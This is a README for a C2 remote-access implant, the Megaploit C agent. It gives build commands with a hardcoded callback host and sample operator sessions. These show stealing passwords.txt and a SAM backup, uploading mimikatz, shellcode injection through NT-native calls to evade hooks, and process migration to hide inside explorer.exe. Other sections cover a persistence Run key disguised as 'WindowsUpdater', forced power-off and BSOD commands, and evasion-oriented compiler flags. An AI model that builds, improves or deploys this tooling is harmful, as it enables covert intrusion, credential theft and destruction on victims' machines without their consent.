# C-remote-shell — Megaploit C Agent

> A hardened, minimal Windows/Linux implant that integrates fully with the Megaploit C2.  
> All traffic is protected by four stacked security layers that exactly mirror the Megaploit listener protocol.  
> Compiled to a **single EXE** with no runtime dependencies — just copy and run.

> **This is an active Work In Progress**. We recently decided to revive this codebase, it will take a while to get all the bugs ironed out and all units working properly.

---

## Table of Contents

- [Quick Start](#quick-start)
- [Commands Reference](#commands-reference)
  - [Shell Commands (all platforms)](#shell-commands-all-platforms)
  - [File System](#file-system)
  - [File Transfer](#file-transfer)
  - [Process Intelligence](#process-intelligence)
  - [Injection & Migration](#injection--migration)
  - [Persistence](#persistence)
  - [Destructive / Power](#destructive--power)
- [Security Architecture](#security-architecture)
- [Building the Agent](#building-the-agent)
  - [Option A — From the C2 Console (recommended)](#option-a--from-the-c2-console-recommended)
  - [Option B — Makefile](#option-b--makefile)
  - [Option C — Direct Compiler Invocation](#option-c--direct-compiler-invocation)
- [Build Flags (Size & Evasion)](#build-flags-size--evasion)
- [Project Layout](#project-layout)
- [Configuration Reference](#configuration-reference)
- [Protocol Wire Format](#protocol-wire-format)
- [What Changed from the Original](#what-changed-from-the-original)

---

## Quick Start

### 1. Generate a TLS certificate and start the Megaploit listener

```bash
# Generate self-signed cert (one-time)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Start the C2
python3 server.py -lh 0.0.0.0 -p 4444 --cert cert.pem --key key.pem
```

### 2. Build and deploy the agent from inside the C2 console

```
megaploit> generate_c 10.0.0.1 4444
```

This runs a full compliance probe, patches `config.h` with your IP/port/key,
compiles via MSVC or MinGW, and prints the resulting EXE path and SHA256.

```
  C2 Compliance Probe Report
  ...
  Summary: 33/33 required signals found  (46/46 total)
  Verdict: [+] COMPLIANT

[+] C-agent built: megaploit_c_agent.exe
    Size:   148,480 bytes
    SHA256: a1b2c3d4...
    Time:   4.2s

    Deploy to target and run -- it will call back to 10.0.0.1:4444
```

### 3. Catch the session

```
megaploit> sessions
ID          Host             OS            User
session-1   192.168.1.100    Windows 10    DESKTOP\john

megaploit> interact session-1
[session-1] > sysinfo
[*] System Information
    OS:           Windows 10.0 (Build 19045)
    Hostname:     DESKTOP-ABC
    Username:     john
    Architecture: x64
    CWD:          C:\Users\john
```

---

## Commands Reference

The agent speaks the exact same wire protocol as the Python/Go agents.
Every standard Megaploit session command works via the `_popen()` shell
fallback. The verbs listed below are handled **natively inside the C agent**
for speed and reliability.

---

### Shell Commands (all platforms)

Any command not explicitly handled is passed to `cmd.exe /C` and the output
is returned. This covers hundreds of built-in Windows tools automatically.

```
[session-1] > whoami
DESKTOP-ABC\john

[session-1] > ipconfig /all
Windows IP Configuration ...

[session-1] > net user
User accounts for \\DESKTOP-ABC ...

[session-1] > net localgroup administrators
Alias name     administrators
Members        Administrator, john

[session-1] > dir C:\Users\john\Desktop
 Volume in drive C is Windows
 Directory of C:\Users\john\Desktop
...
```

---

### File System

#### `sysinfo` — full system info

```
[session-1] > sysinfo
[*] System Information
    OS:           Windows 10.0 (Build 19045)
    Hostname:     DESKTOP-ABC
    Username:     john
    Architecture: x64
    CWD:          C:\Users\john
```

#### `cd <path>` — change working directory

```
[session-1] > cd C:\Windows\Temp
[+] cwd: C:\Windows\Temp

[session-1] > cd ..
[+] cwd: C:\Windows
```

#### `ls [path]` — directory listing

Lists files and directories with sizes and timestamps. Defaults to current
working directory if no path is given.

```
[session-1] > ls
Directory of C:\Users\john\Desktop

  [DIR]  Documents                                   2024-01-10 09:15
  [DIR]  Downloads                                   2024-01-14 17:32
  [   ]  passwords.txt                        1234 bytes  2024-01-15 14:22
  [   ]  notes.docx                          45600 bytes  2024-01-12 11:08

[session-1] > ls C:\Windows\System32
Directory of C:\Windows\System32

  [DIR]  drivers                                     2023-06-15 04:00
  [   ]  cmd.exe                             289792 bytes  2023-06-14 17:45
  ...
```

---

### File Transfer

#### `download <remote-path>` — pull a file from the target

```
[session-1] > download C:\Users\john\passwords.txt
[+] Downloaded: passwords.txt (1.2 KB)

[session-1] > download C:\Windows\Temp\sam.bak
[+] Downloaded: sam.bak (262144 bytes)
```

#### `upload <filename>` — push a file to the target

The server sends the file name first; the next framed message contains the
raw bytes. Megaploit handles this transparently from the operator side.

```
[session-1] > upload /root/tools/mimikatz.exe
# server prompts for local path if needed
[+] Received: mimikatz.exe (1245184 bytes)
```

---

### Process Intelligence

#### `ps` — list all running processes

Shows PID, PPID, process name, architecture (x86/x64 via `IsWow64Process`),
and the token owner (domain\\username via `LookupAccountSid`).

```
[session-1] > ps
  PID      PPID     Name                                     Arch   User
  ---      ----     ----                                     ----   ----
  4        0        System                                   x64    NT AUTHORITY\SYSTEM
  440      4        smss.exe                                 x64    NT AUTHORITY\SYSTEM
  644      636      winlogon.exe                             x64    NT AUTHORITY\SYSTEM
  880      860      explorer.exe                             x64    DESKTOP-ABC\john
  1234     880      chrome.exe                               x64    DESKTOP-ABC\john
  3456     880      notepad.exe                              x64    DESKTOP-ABC\john
  5120     880      cmd.exe                                  x86    DESKTOP-ABC\john
```

---

### Injection & Migration

These commands use the **NT native API directly** — `NtAllocateVirtualMemory`,
`NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx` — to avoid
the most-hooked Win32 layer (`VirtualAllocEx` / `CreateRemoteThread`).

#### `inject <pid> <hex-shellcode>` — inject shellcode into a process

```
# Step 1: find a good host process with ps
[session-1] > ps
  PID      ...  Name            Arch   User
  880      ...  explorer.exe    x64    DESKTOP-ABC\john

# Step 2: generate shellcode with msfvenom (example: calc.exe)
# msfvenom -p windows/x64/exec CMD=calc.exe -f hex
# → fc4883e4f0e8c800...

# Step 3: inject
[session-1] > inject 880 fc4883e4f0e8c800000000...
[+] inject: 279 bytes shellcode injected and executing in PID 880
```

**Evasion notes:**
- Memory is allocated as **RW**, written, then flipped to **RX** before the thread starts. No page is ever RWX.
- Thread created with `THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER`.
- No `VirtualAllocEx` / `CreateRemoteThread` in the IAT.

#### `migrate <pid>` — move the agent into another process

Injects a position-independent bootstrap that calls `LoadLibraryA` on the
agent's EXE path inside the target process. The Windows loader handles all
relocation and IAT resolution. The current agent process exits cleanly after
the new instance starts.

```
# Move into explorer.exe to blend in
[session-1] > migrate 880
[+] migrate: agent spawned in PID 880 — terminating current process

# A new session appears automatically
[+] New session opened: session-2
    Host: 192.168.1.100
    OS:   Windows 10 Pro (x64)
    User: DESKTOP-ABC\john (running inside explorer.exe)
```

**Use cases:**
- Move from a short-lived process (e.g. `cmd.exe`) into a long-lived one (e.g. `explorer.exe`, `svchost.exe`)
- Inherit a higher-integrity token by migrating into a SYSTEM-level process (requires SeDebugPrivilege)
- Make the agent harder to find by hiding inside legitimate traffic

---

### Persistence

#### `persist <regkey-name> <filename>` — install a HKCU Run key

Copies the current EXE to `%APPDATA%\<filename>` and writes a registry
Run key so it starts at user logon.

```
[session-1] > persist WindowsUpdater updater.exe
[+] Persistence installed

# What was done:
# CopyFile(current.exe) → C:\Users\john\AppData\Roaming\updater.exe
# reg add HKCU\...\Run /v WindowsUpdater /d "C:\...\updater.exe" /f
```

Remove persistence:
```
[session-1] > self_destruct
[+] Registry run key removed
[*] Self-destruct complete — terminating.
```

---

### Destructive / Power

These are **C-exclusive verbs** auto-detected by `megaploit/core/c_probe.py`.
The operator commands are registered automatically at server startup.

#### `forceoff` → wire: `forceOff()` — immediate hardware power-off

Calls `NtSetSystemPowerState(PowerActionShutdownOff, ...)` followed by
`NtShutdownSystem(ShutdownPowerOff)`. Bypasses shutdown callbacks and
forcibly cuts power. Requires `SeShutdownPrivilege` (acquired at startup).

```
[session-1] > forceoff
# target machine powers off immediately — no warning dialog
```

#### `bluescreen` → wire: `blueScreen()` — force a kernel BSOD

Calls `NtRaiseHardError(STATUS_ASSERTION_FAILURE, ..., ResponseOption=6)`.
Response option 6 (`OptionShutdownSystem`) triggers an immediate BSOD.

```
[session-1] > bluescreen
# target blue-screens immediately — STOP: CRITICAL_PROCESS_DIED
```

---

## Security Architecture

All four layers are established in `tls_connect()` before any shell traffic.

| # | Layer | Implementation | Mirrors |
|---|-------|----------------|---------|
| 1 | **TLS 1.2 / 1.3** | SChannel — `SP_PROT_TLS1_2_CLIENT \| SP_PROT_TLS1_3_CLIENT`, `SCH_USE_STRONG_CRYPTO` (AEAD-only cipher suites), `ISC_REQ_NO_RENEGOTIATION` | `listener.py build_agent_ssl_context()` |
| 2 | **HMAC-SHA256** | BCrypt — server sends 16-byte random challenge, client replies with `HMAC-SHA256(key, challenge)` = 32 bytes | `crypto.py agent_authenticate()` |
| 3 | **Protocol v2** | Server sends `0x4d` (`'M'`); client echoes back to confirm v2 | `protocol.py handshake_agent()` |
| 4 | **AES-256-GCM** | BCrypt — `[uint32-BE len][nonce(12)][ciphertext+tag(16)]`, uint64-BE seq counter (replay protection). Key handles are **cached** — open once per session, reused for every message (~10× faster than open-per-message). | `protocol.py send_msg() / recv_msg()` |

The compliance prober (`megaploit/core/c_probe.py`) verifies **33 required
signals** across all four layers before `generate_c` will compile the client.

---

## Building the Agent

### Option A — From the C2 Console (recommended)

```
megaploit> generate_c <LHOST> <LPORT>
```

The C2 will:
1. Run 46-signal compliance probe (aborts if any required signal is missing)
2. Auto-discover all `.c` source files and `config.h`
3. Patch `config.h` with the supplied IP, port, and hex-encoded session key
4. Compile via MSVC (`cl.exe`) or MinGW (`x86_64-w64-mingw32-gcc`)

### Option B — Makefile

```bash
# Auto-detect compiler, build with defaults
make

# Override C2 address
make C2_IP=10.0.0.1 C2_PORT=4444

# Force MinGW (Linux/macOS cross-compile)
make CC=x86_64-w64-mingw32-gcc C2_IP=10.0.0.1 C2_PORT=4444

# Force MSVC (from Developer Command Prompt)
make CC=cl C2_IP=10.0.0.1 C2_PORT=4444

# Size-optimised release (default — already applied)
make                          # uses -Os -s (MinGW) or /O1 /GS- (MSVC)
```

### Option C — Direct Compiler Invocation

**MSVC (from a Developer Command Prompt)**

```bat
cl /nologo /W3 /O1 /GS- /Gy /GL /DNDEBUG ^
   /DC2_IP="10.0.0.1" /DC2_PORT=4444 ^
   client\main.c client\ntcalls.c client\shell.c client\inject.c tls\tls_client.c ^
   /link /OPT:REF /OPT:ICF /LTCG ^
   Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib ^
   /out:megaploit_c_agent.exe
```

**MinGW (cross-compile on Linux/macOS)**

```bash
x86_64-w64-mingw32-gcc -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
    -ffunction-sections -fdata-sections -fno-ident -fno-asynchronous-unwind-tables \
    -DC2_IP=\"10.0.0.1\" -DC2_PORT=4444 \
    client/main.c client/ntcalls.c client/shell.c client/inject.c tls/tls_client.c \
    -o megaploit_c_agent.exe \
    -Wl,--gc-sections -Wl,--strip-all \
    -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -mwindows
```

**Standalone POSIX server (for manual testing — no C2 needed)**

```bash
gcc -O2 -Wall -DLISTEN_PORT=4444 \
    server/main.c server/server.c server/prompt.c \
    -o serverShell
./serverShell
```

---

## Build Flags (Size & Evasion)

The Makefile already applies these by default. Documented here for reference.

### MinGW

| Flag | Effect |
|------|--------|
| `-Os` | Optimise for binary size (vs `-O2` which optimises for speed) |
| `-s` | Strip all symbols from the binary |
| `-ffunction-sections -fdata-sections` | Put each function/data in its own section |
| `-Wl,--gc-sections` | Linker dead-strips unreferenced sections |
| `-Wl,--strip-all` | Linker strips remaining symbol info |
| `-fno-ident` | Omit the GCC version string from the binary |
| `-fno-asynchronous-unwind-tables` | Strip `.eh_frame` / `.pdata` (~10–15% smaller) |
| `-mwindows` | GUI subsystem — OS never allocates a console window |

### MSVC

| Flag | Effect |
|------|--------|
| `/O1` | Optimise for size |
| `/GS-` | Disable stack buffer security cookies (saves ~1 KB of overhead) |
| `/Gy` | Function-level linking |
| `/GL` | Whole-program optimisation |
| `/OPT:REF /OPT:ICF` | Dead-code elimination and identical COMDAT folding at link time |
| `/LTCG` | Link-time code generation (works with `/GL`) |

---

## Project Layout

```
C-remote-shell/
│
├── client/               # Windows implant (runs on target)
│   ├── config.h          # C2_IP, C2_PORT, SECRET_KEY_PATH, buffer sizes
│   ├── ntcalls.h/c       # NT native API: RtlAdjustPrivilege, NtShutdownSystem,
│   │                     #   NtRaiseHardError, NtSetSystemPowerState
│   ├── inject.h/c        # inject_shellcode(), migrate_to_pid()
│   │                     #   NtAllocateVirtualMemory, NtWriteVirtualMemory,
│   │                     #   NtProtectVirtualMemory, NtCreateThreadEx
│   ├── shell.h/c         # Verb dispatch table + _popen fallback
│   │                     #   strncmp() calls here are the source of truth
│   │                     #   for c_probe verb extraction
│   └── main.c            # WinMain: mutex, Winsock, key loader, reconnect loop
│
├── tls/                  # Encrypted transport (Windows-native, no OpenSSL)
│   ├── tls_client.h      # TLS_CONTEXT struct + cached BCrypt key handles
│   └── tls_client.c      # SChannel TLS 1.2/1.3 + BCrypt AES-256-GCM + HMAC-SHA256
│
├── server/               # Standalone operator console (no C2 required)
│   ├── config.h          # LISTEN_PORT, LISTEN_ADDR
│   ├── server.h/c        # TCP socket, bind, listen, accept
│   ├── prompt.h/c        # stdin → send → recv → print loop
│   └── main.c            # entry point
│
├── Makefile              # MSVC + MinGW targets; C2_IP/C2_PORT/size flags
├── definitions.h         # Legacy compatibility shim (Source.c)
├── Source.c              # Legacy single-file build (kept for reference)
├── serverShell.c         # Legacy single-file server (kept for reference)
├── CHANGELOG.md          # Full bug-fix log and developer guide
└── README.md             # This file
```

---

## Configuration Reference

| File | Symbol | Default | Purpose |
|------|--------|---------|---------|
| `client/config.h` | `C2_IP` | `192.168.1.226` | C2 server IP. Overridden by `generate_c` at build time. |
| `client/config.h` | `C2_PORT` | `50005` | TCP port. Overridden by `generate_c`. |
| `client/config.h` | `SECRET_KEY_PATH` | `"secret.key"` | Key file path (unused when built via `generate_c`; key is baked in). |
| `client/config.h` | `RECONNECT_DELAY_SEC` | `10` | Seconds between reconnect attempts. |
| `client/config.h` | `SHELL_LINE_BUF` | `4096` | Single `fgets()` line buffer from `_popen()`. |
| `client/config.h` | `SHELL_RESP_BUF` | `65536` | Accumulated `_popen()` output (64 KB). |
| `client/config.h` | `INJECT_MAX_SHELLCODE` | `32768` | Maximum shellcode size for `inject` (32 KB). |
| `client/config.h` | `PS_MAX_PROCS` | `512` | Maximum processes listed by `ps`. |
| `server/config.h` | `LISTEN_PORT` | `50005` | Standalone server listen port. |

---

## Protocol Wire Format

```
Every message (text or file):

  ┌──────────────────────────────────────────────────────────────┐
  │  4 bytes   │  12 bytes  │  N bytes ciphertext + 16-byte tag │
  │ uint32-BE  │ GCM nonce  │  AES-256-GCM(seq_be64 ++ data)   │
  │   length   │            │                                    │
  └──────────────────────────────────────────────────────────────┘

  Plaintext before encryption:
    [uint64-BE sequence number (8 bytes)] [data bytes]

  File download (agent → C2):
    1. agent sends text message: "FILE_OK"
    2. agent sends file frame:   [uint32-BE len][nonce][AES-GCM(seq ++ file bytes)]

  File upload (C2 → agent):
    1. C2 sends text message: "upload <filename>"
    2. C2 sends file frame:   [uint32-BE len][nonce][AES-GCM(seq ++ file bytes)]
```

Replay protection: each side maintains a monotonic `uint64` sequence counter.
Received messages whose sequence number is not strictly greater than the last
accepted one are dropped.

---

## What Changed from the Original

See [`CHANGELOG.md`](CHANGELOG.md) for the full log.

### New features (added in this fork)

| Feature | Files |
|---------|-------|
| `ls` — native directory listing with sizes + timestamps | `client/shell.c` |
| `ps` — process list with arch + owner (via `LookupAccountSid`) | `client/shell.c` |
| `inject <pid> <hex>` — NT-native shellcode injection (W^X, HideFromDebugger) | `client/inject.h/c` |
| `migrate <pid>` — reflective agent migration via LoadLibraryA bootstrap | `client/inject.h/c` |
| BCrypt AES-256-GCM key handle cache — ~10× faster per-message crypto | `tls/tls_client.h/c` |
| MSVC + MinGW size/evasion build flags (dead-code strip, symbol strip, no console alloc) | `Makefile` |

### Bug fixes (vs original `Source.c`)

| Bug | Fix |
|-----|-----|
| `CreateMutexA` passed wide-string literal `L"consoleShell"` | Narrow string literal |
| `WSAStartup(MAKEWORD(2,0))` — requested Winsock 2.0 | `MAKEWORD(2,2)` |
| `inet_addr()` deprecated, returns `INADDR_NONE` for `255.255.255.255` | `InetPtonA()` |
| Socket leaked on `connect()` failure (`WSAETIMEDOUT`) | Socket recreated on every retry |
| `SecureZeroMemory(secretKey)` was dead code (inside `while(1)` after infinite loop logic) | Wipe immediately after `tls_connect()` copies it |
| `AllocConsole()` + `ShowWindow(SW_HIDE)` — suspicious AV heuristic | Removed; GUI subsystem means OS never allocates a console |
| `forceOff()` `strncmp` length `11` → `10` | Fixed |
| `fclose()` on `_popen()` handle | `_pclose()` |
| NT status check inverted (`if (status) return;` meant "exit on success") | Inverted condition |
| Empty `_popen()` output sent zero bytes (recv blocked) | Single-space sentinel sent instead |
| 1024-byte `sysinfo` buffer too small | 4 KB |

### Server bug fixes (vs original `serverShell.c`)

| Bug | Fix |
|-----|-----|
| `sin_addr.s_addr` never assigned — bind address undefined | Assigned `INADDR_ANY` |
| `forceOff()` `strncmp` length `12` → `10` | Fixed |
| Dangling `else` caused `blueScreen()` to fall into `recv()` | Braces added |
| `write()` sent full 1024-byte buffer regardless of `strlen` | Fixed to use `strlen` |
| `socket()` and `accept()` return values unchecked | Both now checked |

---

## Adding a New C-Exclusive Command

1. Implement a handler function in `client/shell.c`:
   ```c
   static void _handle_reboot(TLS_CONTEXT *pTls) {
       // ... implementation ...
       _send_str(pTls, "[+] rebooting");
   }
   ```

2. Add a dispatch branch before the shell fallback:
   ```c
   if (cbCmd >= 8 && strncmp("reboot()", cmd, 8) == 0) {
       free(pCmd); pCmd = NULL;
       _handle_reboot(pTls);
       continue;
   }
   ```

3. That's it. `megaploit/core/c_probe.py` detects the `strncmp("reboot()", ...)` call
   at the next server start and `commands.py` auto-registers the `reboot` operator command.
   No Python changes needed.

---

*Part of the [Megaploit](https://github.com/Josefifir/Megaploit) C2 framework.*
